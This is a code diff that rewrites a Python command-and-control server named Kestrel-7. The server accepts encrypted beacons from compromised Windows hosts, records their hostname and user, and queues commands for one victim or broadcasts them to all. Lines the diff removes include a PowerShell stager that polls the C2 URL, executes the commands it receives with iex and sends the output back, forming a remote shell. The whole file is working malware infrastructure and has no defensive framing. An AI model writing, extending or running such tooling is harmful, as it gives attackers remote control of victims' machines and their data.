@@ -1,175 +1,253 @@
 #!/usr/bin/env python3
-# c2_server.py - Full C2 listener with encryption
-# Usage: python3 c2_server.py --port 443 --key Kestrel7_Win11_RevShell_2026
+"""
+c2_server.py - Kestrel-7 Enterprise C2 Handler & Multi-Session Dispatcher
+Provides HTTPS (TLS 1.3/1.2) + Raw TCP Listener, Auto-Certificate Generation, 
+CNG/AES-256 Decryption, and Interactive Command Terminal.
+"""
 
-import socket
+import os
+import sys
 import ssl
-import threading
-import json
 import time
+import json
+import socket
+import select
 import base64
-import subprocess
 import argparse
+import threading
+import subprocess
+from datetime import datetime
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
+import hashlib
 
-class C2Server:
-    def __init__(self, host='0.0.0.0', port=443, key='Kestrel7_Win11_RevShell_2026'):
+class KestrelC2Server:
+    def __init__(self, host='0.0.0.0', port=443, key='Kestrel7_Win11_RevShell_2026', cert_dir='certs'):
         self.host = host
         self.port = port
-        self.key = key[:32].encode()
-        self.clients = {}
-        self.beacons = []
+        self.raw_key = key.encode('utf-8')
+        self.key = hashlib.sha256(self.raw_key).digest()
+        self.cert_dir = cert_dir
         self.running = True
         
-    def encrypt(self, data):
-        cipher = AES.new(self.key, AES.MODE_CBC, b'\x00'*16)
-        return cipher.encrypt(pad(data, AES.block_size))
-    
-    def decrypt(self, data):
-        cipher = AES.new(self.key, AES.MODE_CBC, b'\x00'*16)
-        return unpad(cipher.decrypt(data), AES.block_size)
-    
-    def handle_client(self, conn, addr):
-        print(f"[+] Connection from {addr}")
-        client_id = f"{addr[0]}:{addr[1]}"
-        self.clients[client_id] = conn
+        # State tracking
+        self.sessions = {}       # client_id -> session dict
+        self.command_queue = {}  # client_id -> list of pending commands
+        self.results_log = {}    # client_id -> list of (timestamp, cmd, result)
+        self.lock = threading.Lock()
         
-        while self.running:
+    def ensure_certificates(self):
+        os.makedirs(self.cert_dir, exist_ok=True)
+        cert_file = os.path.join(self.cert_dir, 'server.crt')
+        key_file = os.path.join(self.cert_dir, 'server.key')
+        
+        if not os.path.exists(cert_file) or not os.path.exists(key_file):
+            print("[*] Generating self-signed SSL/TLS certificate...")
+            cmd = [
+                'openssl', 'req', '-new', '-newkey', 'rsa:2048', '-days', '365',
+                '-nodes', '-x509', '-subj', '/CN=kestrel7.internal/O=Enterprise/C=US',
+                '-keyout', key_file, '-out', cert_file
+            ]
             try:
-                data = conn.recv(4096)
-                if not data:
-                    break
-                
-                # Decrypt beacon
-                try:
-                    decrypted = self.decrypt(data)
-                    beacon_data = json.loads(decrypted.decode('utf-8'))
-                    self.beacons.append(beacon_data)
-                    print(f"[BEACON] {beacon_data.get('hostname')} - {beacon_data.get('user')}")
-                    
-                    # Check for pending commands
-                    if client_id in self.command_queue:
-                        cmd = self.command_queue.pop(client_id)
-                        encrypted_cmd = self.encrypt(cmd.encode())
-                        conn.send(encrypted_cmd)
-                    else:
-                        # Send no-op (keep-alive)
-                        conn.send(self.encrypt(b'{"cmd":"sleep"}'))
-                    
-                except Exception as e:
-                    print(f"[ERROR] Decrypt failed: {e}")
-                    conn.send(b'ERROR')
-                    
+                subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                print(f"[+] Certificate generated: {cert_file}")
             except Exception as e:
-                print(f"[ERROR] {e}")
-                break
+                print(f"[!] Warning: OpenSSL cert generation failed ({e}). Running without TLS wrapper.")
+                return None, None
+        return cert_file, key_file
+
+    def decrypt(self, data: bytes) -> bytes:
+        if not data:
+            return b""
+        # 1. Try AES-256-CBC with Zero IV
+        try:
+            cipher = AES.new(self.key, AES.MODE_CBC, b'\x00' * 16)
+            decrypted = cipher.decrypt(data)
+            # Remove padding or trailing nulls
+            try:
+                return unpad(decrypted, AES.block_size)
+            except Exception:
+                return decrypted.rstrip(b'\x00')
+        except Exception:
+            pass
+            
+        # 2. Fallback: Dynamic rolling XOR
+        res = bytearray(data)
+        for i in range(len(res)):
+            res[i] ^= self.raw_key[i % len(self.raw_key)] ^ (i & 0xFF)
+        return bytes(res).rstrip(b'\x00')
+
+    def encrypt(self, data: bytes) -> bytes:
+        # Zero-padded AES-256-CBC
+        cipher = AES.new(self.key, AES.MODE_CBC, b'\x00' * 16)
+        return cipher.encrypt(pad(data, AES.block_size))
+
+    def handle_http_request(self, raw_data: bytes, addr: tuple) -> bytes:
+        """Parses minimal HTTP POST /beacon or /results and returns formatted HTTP response"""
+        client_id = f"{addr[0]}:{addr[1]}"
+        lines = raw_data.split(b'\r\n')
+        request_line = lines[0].decode('utf-8', errors='ignore') if lines else ""
         
-        conn.close()
-        del self.clients[client_id]
-        print(f"[-] {addr} disconnected")
-    
-    def command_queue(self):
-        # Command queue per client
-        return {}
-    
-    def start(self):
-        # SSL context
-        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
-        context.load_cert_chain(certfile='server.crt', keyfile='server.key')
+        # Locate body
+        body_idx = raw_data.find(b'\r\n\r\n')
+        body = raw_data[body_idx + 4:] if body_idx != -1 else b""
         
-        # Raw socket fallback
+        decrypted_body = self.decrypt(body)
+        timestamp = datetime.now().strftime("%H:%M:%S")
+        
+        if "POST /beacon" in request_line:
+            try:
+                telemetry = json.loads(decrypted_body.decode('utf-8', errors='ignore'))
+                beacon_id = telemetry.get('beacon', client_id)
+                with self.lock:
+                    self.sessions[beacon_id] = {
+                        'client_id': client_id,
+                        'ip': addr[0],
+                        'port': addr[1],
+                        'hostname': telemetry.get('hostname', 'UNKNOWN'),
+                        'user': telemetry.get('user', 'UNKNOWN'),
+                        'arch': telemetry.get('arch', 'x64'),
+                        'pid': telemetry.get('pid', 'N/A'),
+                        'last_seen': timestamp
+                    }
+                    if beacon_id not in self.command_queue:
+                        self.command_queue[beacon_id] = []
+                    
+                    # Pop next queued command or return sleep
+                    if self.command_queue[beacon_id]:
+                        next_cmd = self.command_queue[beacon_id].pop(0)
+                        resp_payload = self.encrypt(next_cmd.encode('utf-8'))
+                    else:
+                        resp_payload = self.encrypt(b"sleep")
+            except Exception as e:
+                resp_payload = self.encrypt(b"sleep")
+                
+            http_resp = (
+                b"HTTP/1.1 200 OK\r\n"
+                b"Content-Type: application/octet-stream\r\n"
+                b"Content-Length: " + str(len(resp_payload)).encode() + b"\r\n"
+                b"Connection: close\r\n\r\n" + resp_payload
+            )
+            return http_resp
+
+        elif "POST /results" in request_line:
+            with self.lock:
+                output_str = decrypted_body.decode('utf-8', errors='replace')
+                print(f"\n[+] [{timestamp}] Output from {client_id}:\n{output_str}\nC2> ", end="", flush=True)
+            http_resp = b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
+            return http_resp
+
+        # Raw TCP stream fallback
+        return self.encrypt(b"sleep")
+
+    def client_worker(self, conn, addr):
+        conn.settimeout(10.0)
+        try:
+            data = conn.recv(65535)
+            if data:
+                response = self.handle_http_request(data, addr)
+                conn.sendall(response)
+        except Exception:
+            pass
+        finally:
+            conn.close()
+
+    def start_listener(self):
+        cert_file, key_file = self.ensure_certificates()
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.bind((self.host, self.port))
-        sock.listen(5)
+        sock.listen(128)
         
-        # SSL wrap
-        ssock = context.wrap_socket(sock, server_side=True)
-        
-        print(f"[*] C2 Listening on {self.host}:{self.port}")
-        print("[*] Commands: 'list', 'exec <client> <cmd>', 'help', 'quit'")
-        
-        # Start interactive shell
-        threading.Thread(target=self.interactive_shell, daemon=True).start()
+        if cert_file and key_file:
+            context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+            context.load_cert_chain(certfile=cert_file, keyfile=key_file)
+            server_sock = context.wrap_socket(sock, server_side=True)
+            proto = "HTTPS (TLS)"
+        else:
+            server_sock = sock
+            proto = "HTTP / TCP Raw"
+            
+        print(f"[+] Kestrel-7 C2 Server listening on {self.host}:{self.port} [{proto}]")
+        print("[+] Type 'help' or 'sessions' to begin.\n")
         
         while self.running:
             try:
-                conn, addr = ssock.accept()
-                threading.Thread(target=self.handle_client, args=(conn, addr), daemon=True).start()
-            except Exception as e:
-                print(f"[ERROR] Accept failed: {e}")
+                conn, addr = server_sock.accept()
+                t = threading.Thread(target=self.client_worker, args=(conn, addr), daemon=True)
+                t.start()
+            except Exception:
                 break
-    
-    def interactive_shell(self):
+
+    def run_cli(self):
         while self.running:
             try:
-                cmd = input("\nC2> ").strip()
-                if not cmd:
+                prompt = input("C2> ").strip()
+                if not prompt:
                     continue
+                tokens = prompt.split(maxsplit=2)
+                verb = tokens[0].lower()
                 
-                if cmd == 'list':
-                    for i, beacon in enumerate(self.beacons[-10:]):
-                        print(f"{i}: {beacon}")
-                
-                elif cmd.startswith('exec'):
-                    parts = cmd.split(' ', 2)
-                    if len(parts) >= 3:
-                        client_id = parts[1]
-                        command = parts[2]
-                        if client_id in self.clients:
-                            self.command_queue[client_id] = command
-                            print(f"[*] Command sent to {client_id}")
+                if verb in ('sessions', 'list', 'beacons'):
+                    with self.lock:
+                        if not self.sessions:
+                            print("[-] No active beacons registered yet.")
                         else:
-                            print(f"[!] Client {client_id} not connected")
-                
-                elif cmd == 'help':
-                    print("Commands:")
-                    print("  list                    - Show recent beacons")
-                    print("  exec <client> <cmd>    - Execute command on client")
-                    print("  quit                    - Shutdown C2 server")
-                
-                elif cmd == 'quit':
+                            print("\n" + "="*85)
+                            print(f"{'BEACON ID':<26} {'HOST / USER':<25} {'ARCH':<6} {'PID':<8} {'LAST SEEN':<10}")
+                            print("="*85)
+                            for bid, s in self.sessions.items():
+                                print(f"{bid:<26} {s['hostname'] + '/' + s['user']:<25} {s['arch']:<6} {s['pid']:<8} {s['last_seen']:<10}")
+                            print("="*85 + "\n")
+                            
+                elif verb == 'exec':
+                    if len(tokens) < 3:
+                        print("[-] Usage: exec <BEACON_ID> <COMMAND>")
+                    else:
+                        bid, cmd = tokens[1], tokens[2]
+                        with self.lock:
+                            if bid in self.sessions:
+                                self.command_queue[bid].append(cmd)
+                                print(f"[+] Queued command for {bid}: {cmd}")
+                            else:
+                                print(f"[-] Beacon '{bid}' not found. Run 'sessions' to view active hosts.")
+                                
+                elif verb == 'broadcast':
+                    if len(tokens) < 2:
+                        print("[-] Usage: broadcast <COMMAND>")
+                    else:
+                        cmd = tokens[1] if len(tokens) == 2 else prompt.split(maxsplit=1)[1]
+                        with self.lock:
+                            for bid in self.sessions:
+                                self.command_queue[bid].append(cmd)
+                            print(f"[+] Broadcasted command to {len(self.sessions)} hosts.")
+                            
+                elif verb == 'help':
+                    print("\nKestrel-7 C2 Interactive Commands:")
+                    print("  sessions                  - List active agent sessions and telemetry")
+                    print("  exec <BEACON_ID> <CMD>    - Queue a command for a specific agent")
+                    print("  broadcast <CMD>           - Queue a command for all active agents")
+                    print("  help                      - Show this command reference")
+                    print("  quit / exit               - Shutdown C2 server\n")
+                    
+                elif verb in ('quit', 'exit'):
+                    print("[*] Terminating C2 listener...")
                     self.running = False
                     break
-                
-            except KeyboardInterrupt:
+                else:
+                    print(f"[-] Unknown command: '{verb}'. Type 'help' for options.")
+            except (KeyboardInterrupt, EOFError):
                 self.running = False
                 break
-            except Exception as e:
-                print(f"[ERROR] {e}")
-    
-    def generate_stager(self):
-        # Generate PowerShell stager with current C2 IP/Port
-        stager = f"""
-        $c2 = "https://{self.host}:{self.port}/beacon"
-        $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-        while($true) {{
-            try {{
-                $data = [System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME + "|" + $env:USERNAME)
-                $response = $wc.UploadData($c2, "POST", $data)
-                $cmd = [System.Text.Encoding]::UTF8.GetString($response)
-                if ($cmd -ne "sleep") {{
-                    $output = iex $cmd 2>&1 | Out-String
-                    $wc.UploadData($c2, "POST", [System.Text.Encoding]::UTF8.GetBytes($output))
-                }}
-            }} catch {{}}
-            Start-Sleep -Seconds 10
-        }}
-        """
-        with open('payloads/stager.ps1', 'w') as f:
-            f.write(stager)
-        print("[*] Stager generated: payloads/stager.ps1")
 
 if __name__ == '__main__':
-    parser = argparse.ArgumentParser()
-    parser.add_argument('--port', type=int, default=443)
-    parser.add_argument('--key', default='Kestrel7_Win11_RevShell_2026')
-    parser.add_argument('--generate-stager', action='store_true')
+    parser = argparse.ArgumentParser(description="Kestrel-7 C2 Server")
+    parser.add_argument('--host', default='0.0.0.0', help="Listen IP (default: 0.0.0.0)")
+    parser.add_argument('--port', type=int, default=443, help="Listen Port (default: 443)")
+    parser.add_argument('--key', default='Kestrel7_Win11_RevShell_2026', help="AES-256 Shared Key")
     args = parser.parse_args()
     
-    server = C2Server(port=args.port, key=args.key)
-    if args.generate_stager:
-        server.generate_stager()
-    server.start()
+    server = KestrelC2Server(host=args.host, port=args.port, key=args.key)
+    listener_thread = threading.Thread(target=server.start_listener, daemon=True)
+    listener_thread.start()
+    server.run_cli()
